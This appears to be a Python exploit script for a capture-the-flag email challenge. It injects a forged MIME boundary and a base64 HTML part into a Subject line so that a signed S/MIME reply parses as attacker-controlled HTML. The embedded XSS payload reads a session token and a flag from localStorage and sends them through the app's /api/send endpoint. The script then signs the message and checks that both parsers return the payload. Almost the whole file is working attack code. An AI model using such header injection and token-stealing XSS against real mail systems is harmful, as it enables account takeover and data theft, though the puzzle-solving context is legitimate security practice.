import base64, subprocess, os, sys, re
os.chdir('/tmp/ostest')

# ---- predicted inner boundary of the signed reply (stand-in for the MT19937 prediction)
B1 = '===============1234567890123456789=='
B2P = None

PWN = ("<img src=x onerror=\"fetch('/api/send',{method:'POST',"
       "headers:{'Content-Type':'application/json','token':localStorage.getItem('token')},"
       "body:JSON.stringify({to:'user@ses',subject:'pwned',body:String(localStorage.getItem('flag'))})})\">")
b64 = base64.b64encode(PWN.encode()).decode()

# D = what parsed.subject of our first email must be -> becomes the reply subject "Re: <D>"
# leading blank line => the outer header block of the reply ends right after "Subject: Re: "
D = ("\r\n\r\n"
     "\n--" + B1 + " \nContent-Type : text/html\nContent-Transfer-Encoding : base64\n\n"
     + b64 + "\n--" + B1 + "-- ")

TEMPLATE = open('./_z_496/template.jinja2').read()
BODY = "\n\n".join([
    "We've gotten your message and will respond soon.",
    "Thank you for choosing SES!",
    "Best regards,",
    "The Secure Email Service Team",
])
content = (TEMPLATE.replace('{{ title }}', 'Re: ' + D)
                   .replace('{{ content }}', BODY))

inner = ('Content-Type: multipart/mixed; boundary="' + B1 + '"\n'
         'MIME-Version: 1.0\n\n'
         '--' + B1 + '\nContent-Type: text/plain; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
         + content + '\n'
         '--' + B1 + '\nContent-Type: text/html; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
         + content + '\n'
         '--' + B1 + '--\n')
open('inner5.txt', 'w').write(inner)

subprocess.run(['openssl', 'cms', '-sign', '-in', 'inner5.txt', '-signer', 'cert.pem', '-inkey', 'key.pem',
                '-outform', 'SMIME', '-out', 'signed5.eml', '-md', 'sha256'], check=True)

raw = open('signed5.eml').read()
head, rest = raw.split('\n\n', 1)
# smail header order is: Content-Type, MIME-Version, then the original From/To/Subject last
hdr = head + '\nFrom: admin@ses\nTo: admin@ses\nSubject: Re: ' + D
reply = hdr + '\n' + rest
open('reply5.eml', 'w').write(reply)
open('./_z_496_emls/reply5.eml', 'w').write(reply)

def parse(path, label):
    r = subprocess.run(['node', './_z_496_parse.js', path], capture_output=True, text=True)
    out = r.stdout.strip()
    print('===============', label, '===============')
    try:
        import json
        j = json.loads(out)
        for k, v in j.items():
            print(' ', k, '=', (v[:120].replace('\n', '\\n').replace('\r', '\\r') if isinstance(v, str) else v))
        return j
    except Exception:
        print(out[:400], r.stderr[:300])
        return None

print('PWN =', PWN)
print('B1  =', B1)
j1 = parse('./_z_496_emls/reply5.eml', 'TOP-LEVEL parse of reply')
print('html == PWN ?', bool(j1 and j1.get('html') == PWN))

r = subprocess.run(['openssl', 'cms', '-verify', '-in', 'reply5.eml', '-CAfile', 'cert.pem', '-out', 'out5.txt'],
                   capture_output=True, text=True)
print('verify rc', r.returncode, r.stderr.strip()[:200])
if r.returncode == 0:
    open('./_z_496_emls/out5.eml', 'w').write(open('out5.txt').read())
    j2 = parse('./_z_496_emls/out5.eml', 'parse of VERIFIED content')
    print('html == PWN ?', bool(j2 and j2.get('html') == PWN))
